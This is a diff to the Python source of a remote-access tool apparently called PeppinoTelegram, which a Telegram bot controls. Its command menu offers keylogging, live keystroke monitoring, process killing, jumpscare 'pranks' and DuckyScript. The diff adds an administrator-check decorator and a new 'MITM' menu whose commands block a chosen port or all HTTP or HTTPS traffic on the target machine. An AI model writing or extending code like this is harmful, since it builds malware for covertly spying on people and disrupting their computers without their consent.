@@ -43,6 +43,7 @@ import json
 import ctypes
 import psutil
 import inspect
+import functools
 import traceback
 from io import BytesIO
 import pyautogui as pg
@@ -293,6 +294,14 @@ def terminate_process_by_name(process_name: str) -> None:
         if proc.name().lower() == process_name.lower().strip():
                 proc.terminate()
 
+def requires_admin(func):
+    @functools.wraps(func)
+    def wrapper(self, *args, **kwargs):
+        if is_admin():
+            return func(self, *args, **kwargs)
+        self.bsend("This function requires the program to be started as administrator")
+    return wrapper
+
 
 """
 ooooooooo.     .oooooo.   ooooooooo.
@@ -348,6 +357,7 @@ class PeppinoTelegram:
         self.audio_mixer = mixer
         self.running = True
         self.message_timeout = 5
+        self.has_admin = is_admin()
 
         self.process_explorer_menu = None
         self.mixer_menu_keyboard = None
@@ -387,6 +397,7 @@ class PeppinoTelegram:
             Command("menu_cantopen", self.menu_cantopen, "Open Can't Open List menu.", "🏠 Menu", "🔒 Can't Open List"),
             Command("menu_keylogger", self.menu_keylogger, "Open Keylogger menu.", "🏠 Menu", "🧠 Keylogger"),
             Command("menu_misc", self.menu_misc, "Open Misc menu.", "🏠 Menu", "🦑 Misc"),
+            Command("menu_mitm", self.menu_mitm, "Open MITM menu.", "🏠 Menu", "🕵️‍♂️ MITM"),
             Command("menu_plugins", self.menu_plugins, "Open Plugins menu.", "🏠 Menu", "🔌 Your Plugins"),
             Command("menu_duckyscript", self.menu_ducky, "Opens ducky quick keys.", "🏠 Menu", "🦆 DuckyScript"),
             
@@ -458,7 +469,7 @@ class PeppinoTelegram:
             Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "😈 Pranks", "🎞️ Set Video Wallpaper"),
             Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "😈 Pranks", "🖥️🌀 Video Signal Drowning Effect"),
             Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "😈 Pranks", "🌀📻 Video&Sound Disturbance"),
-            Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "😈 Pranks", "👻 Whisper Overlay"),
+            Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "😈 Pranks", "👻 Red Text Overlay"),
 
             # 🦑 Misc & Memes
             Command("plankton", self.plankton, "Plankton jumpscare.", "🦑 Misc", "🦑 Plankton"),
@@ -508,6 +519,11 @@ class PeppinoTelegram:
             # 🧠 Keylogger
             Command("keylogger", self.keylogger, "Log keystrokes to file.", "🧠 Keylogger", "⌨️ Keylogger"),
             Command("livekeylogger", self.live_keylogger, "Live keystroke monitoring.", "🧠 Keylogger", "📡 Livekeylogger"),
+
+            # 🕵️‍♂️ MITM
+            Command("block_port", self.block_port, "Blocks traffic on a specific port.", "🕵️‍♂️ MITM", "Block Port"),
+            Command("block_http", self.block_http, "Blocks traffic http", "🕵️‍♂️ MITM", "Block HTTP"),
+            Command("block_https", self.block_https, "Blocks traffic on a specific port.", "🕵️‍♂️ MITM", "Block HTTPS"),
 
             # 🔧 Utilities & Testing
             Command("stop", self.stop, "Stop current operation.", "🔧 Utility", "🛑 Stop"),
@@ -568,6 +584,22 @@ class PeppinoTelegram:
 
     def ask_yesno(self, custom_message: str = "Confirm? Y/n") -> bool:
         return self.send_prompt(custom_message).lower().strip() == "y"
+    
+    # TODO: loading bar not updating!!
+    @requires_admin
+    def block_port(self, port: int, timeout: int) -> None:
+        loading_bar = self.new_loading_bar_timed_worker("Blocking Port", timeout, block_port, (port, timeout))
+        loading_bar.start()
+
+    @requires_admin
+    def block_http(self, timeout: int) -> None:
+        loading_bar = self.new_loading_bar_timed_worker("Blocking HTTP", timeout, block_http, (timeout,))
+        loading_bar.start()
+
+    @requires_admin
+    def block_https(self, timeout: int) -> None:
+        loading_bar = self.new_loading_bar_timed_worker("Blocking HTTPS", timeout, block_https, (timeout,))
+        loading_bar.start()
 
     def breath(self) -> None:
         self.__play_loaded_sound("breath")
@@ -1103,6 +1135,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             ("🧠 Keylogger", "🧠 Keylogger", "/menu_keylogger"),
             ("🦑 Misc", "🦑 Misc", "/menu_misc"),
             ("🦆 DuckyScript", "🦆 DuckyScript", "/menu_duckyscript"),
+            ("🕵️‍♂️ Mitm", "🕵️‍♂️ Mitm", "/menu_mitm"),
             ("🔌 PlugIns", "🔌 Your Plugins", "/menu_plugins"),
         ]:
             buttons[label] = submenu
@@ -1186,6 +1219,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def menu_keylogger(self):
         return self.generate_category_menu("🧠 Keylogger", "🧠 Keylogger")
 
+    def menu_mitm(self):
+        return self.generate_category_menu("🕵️‍♂️ MITM", "🕵️‍♂️ MITM")
+
     def menu_misc(self):
         return self.generate_category_menu("🦑 Misc", "🦑 Misc")
 
@@ -1209,8 +1245,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.bars.update({id(loadingbar):loadingbar})
         return loadingbar
 
-    def new_loading_bar_timed_worker(self, duration: int, target: Callable, args: tuple=()) -> None:
-        loadingbar_tw = LoadingBarTimedWorker(duration=duration, chat_id=self.owner_id, bot=self.bot, target=target, args=args, loading_bar_kwargs={
+    def new_loading_bar_timed_worker(self, label: str, duration: int, target: Callable, args: tuple=()) -> LoadingBarTimedWorker:
+        loadingbar_tw = LoadingBarTimedWorker(label=label,duration=duration, chat_id=self.owner_id, bot=self.bot, target=target, args=args, loading_bar_kwargs={
             "full_char":self.loading_bar_set[0],
             "empty_char":self.loading_bar_set[1],
             "spinner_frames":self.loading_bar_spinner,
